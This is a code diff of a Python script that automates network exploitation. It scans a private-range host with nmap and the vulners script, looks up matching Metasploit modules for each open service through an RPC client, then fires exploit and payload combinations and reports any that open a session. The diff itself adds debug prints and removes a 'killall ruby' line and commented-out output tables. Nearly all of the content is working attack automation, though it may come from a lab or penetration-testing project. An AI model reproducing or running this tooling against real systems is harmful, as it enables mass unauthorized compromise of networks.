@@ -17,10 +17,11 @@ console = client.consoles.console(cid)
 
 nm = nmap.PortScanner()
 
-nm.scan(hosts="10.0.0.1/24", arguments='-O -sV -T4 -Pn --script vulners --exclude 10.0.0.6')
+nm.scan(hosts="10.0.0.42", arguments='-O -sV -T4 -Pn --script vulners --exclude 10.0.0.6')
 
 # '/' is not platform independant and neither is 'cd' #
 def findModules(service, details, port):
+    print("testing port:" + str(port))
     hostDir = 'cd ' + startDir[1:] + '/' + host
     outFile = service + str(port) + '.csv'
     console.write('cd /')
@@ -40,8 +41,8 @@ def findModules(service, details, port):
 
 
 for host in nm.all_hosts():
-    #df2 = pd.DataFrame(columns=['Host','Service','Port','Exploit','Payload','Result'])
     exploitObjects = []
+    print(len(nm[host]['tcp'].keys()))
     os.system('cd / && cd ' + startDir[1:] + ' && mkdir ' + host)
     for port in nm[host]['tcp'].keys():
         service = str(nm[host]['tcp'][port]['name'])
@@ -51,8 +52,7 @@ for host in nm.all_hosts():
         try:
             df = pd.read_csv(filePath, skipinitialspace=True, usecols=['Name'])
         except:
-            os.system("killall ruby")
-            break
+            print("No results")
         dfLen = len(df)
         # countMSMod = countMSMod + dfLen
         if dfLen > 0:
@@ -88,11 +88,12 @@ for host in nm.all_hosts():
                         try:
                             payload = exploit2.targetpayloads()[i]
                             payloadObj = client.modules.use('payload', payload)
-                            console.run_module_with_output(exploit2, payload=payloadObj)
+                            print(exploit2.execute(payload=payloadObj))
                             failed = False
                         except:
                             i += 1
                     time.sleep(5)
+
                     if len(client.sessions.list) > sessionsBefore:
                         print("The exploit worked!")
                         result = 'Success'
@@ -105,18 +106,8 @@ for host in nm.all_hosts():
                     exploitObjects.append(hostExploits)
                 else:
                     print("No payload selected for: " + exploitName)
-
-                #print("IP               Service             Port            Exploit                   Payload             Result             ")
-                #print(hostExploits["IP"] + "            " + hostExploits["Service"] + "            " + hostExploits["Port"] + "            " + hostExploits["Exploit"] + "         " + hostExploits["Payload"] + "         " + hostExploits["Result"])
-
         else:
             pass # No modules found for this service / port
-
-
-    # print("Exploits for host: " + host + "\n")
-    # print("IP               Service             Port            Exploit                   Payload             Result             ")
-    # print(hostExploits["IP"] + "            " + hostExploits["Service"] + "            " + hostExploits["Port"] + "            " + hostExploits["Exploit"] + "         " + hostExploits["Payload"] + "         " + hostExploits["Result"])
-    # # print(df2.head(20))
     for x in exploitObjects:
         print(x)
 
